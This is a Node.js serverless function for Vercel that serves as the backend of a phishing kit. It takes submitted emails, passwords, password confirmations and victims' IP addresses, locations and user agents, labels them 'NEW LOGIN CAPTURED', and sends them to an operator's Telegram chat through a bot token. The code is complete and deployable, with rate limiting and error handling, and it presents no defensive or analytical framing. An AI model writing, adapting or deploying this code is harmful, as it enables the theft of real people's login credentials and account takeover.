// api/report.js — Vercel Node.js Serverless Function
// Environment variables (set in Vercel Dashboard):
//   TELEGRAM_BOT_TOKEN
//   TELEGRAM_CHAT_ID
//   ALLOWED_ORIGIN (optional, e.g. "https://your-site.vercel.app")

const rate = new Map();
const WINDOW_MS = 60_000;
const MAX_PER_WINDOW = 5;

function rateLimited(ip) {
  const now = Date.now();
  const arr = (rate.get(ip) || []).filter(t => now - t < WINDOW_MS);
  if (arr.length >= MAX_PER_WINDOW) return true;
  arr.push(now);
  rate.set(ip, arr);
  return false;
}

function esc(s) {
  return String(s ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

module.exports = async function handler(req, res) {
  // CORS headers
  const origin = process.env.ALLOWED_ORIGIN || '*';
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Vary', 'Origin');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, error: 'Method not allowed' });
  }

  // Rate limiting
  const ip =
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.socket?.remoteAddress ||
    'unknown';

  if (rateLimited(ip)) {
    return res.status(429).json({ ok: false, error: 'Too many requests. Please wait.' });
  }

  // Parse body
  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { body = {}; }
  }
  body = body || {};

  const { email, password, confirm, ip: userIp, country, city, ua, ts } = body;

  if (!email || !password) {
    return res.status(400).json({ ok: false, error: 'Missing required fields' });
  }

  // Validate credentials exist
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    console.error('Server misconfigured: missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    return res.status(500).json({ ok: false, error: 'Server configuration error' });
  }

  // Build Telegram message
  const text =
    `🔐 <b>NEW LOGIN CAPTURED</b>\n\n` +
    `📧 <b>Email:</b> <code>${esc(email)}</code>\n` +
    `🔑 <b>Password:</b> <code>${esc(password)}</code>\n` +
    `🔑 <b>Confirm:</b> <code>${esc(confirm)}</code>\n\n` +
    `🌍 <b>IP:</b> <code>${esc(userIp)}</code>\n` +
    `🌎 <b>Country:</b> ${esc(country)}\n` +
    `🏙️ <b>City:</b> ${esc(city)}\n` +
    `🖥️ <b>UA:</b> <code>${esc(ua)}</code>\n` +
    `🕒 <b>Time:</b> ${esc(ts)}`;

  // Send to Telegram
  try {
    const tg = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });

    const tgData = await tg.json();

    if (!tg.ok || !tgData.ok) {
      console.error('Telegram API error:', tg.status, tgData);
      return res.status(502).json({
        ok: false,
        error: tgData.description || `Telegram HTTP ${tg.status}`
      });
    }

    return res.status(200).json({ ok: true });
  } catch (err) {
    console.error('Network error calling Telegram:', err);
    return res.status(502).json({ ok: false, error: 'Failed to reach Telegram' });
  }
};
